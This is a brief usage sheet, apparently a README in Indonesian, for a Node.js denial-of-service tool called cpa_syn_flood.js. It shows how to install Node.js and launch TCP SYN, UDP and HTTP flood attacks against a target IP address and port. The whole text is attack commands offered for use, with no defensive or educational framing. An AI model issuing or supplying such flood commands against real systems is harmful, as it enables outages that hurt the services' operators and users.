BISMILLAHIRRAHMANIRRAHIM 

# Install Node.js 
pkg install nodejs

# Tampilkan bantuan
node cpa_syn_flood.js --help

# TCP SYN Flood
node cpa_syn_flood.js 192.168.1.100 80 100 tcp

# UDP Flood
node cpa_syn_flood.js 192.168.1.100 53 50 udp

# HTTP Flood
node cpa_syn_flood.js 192.168.1.100 8080 200 http
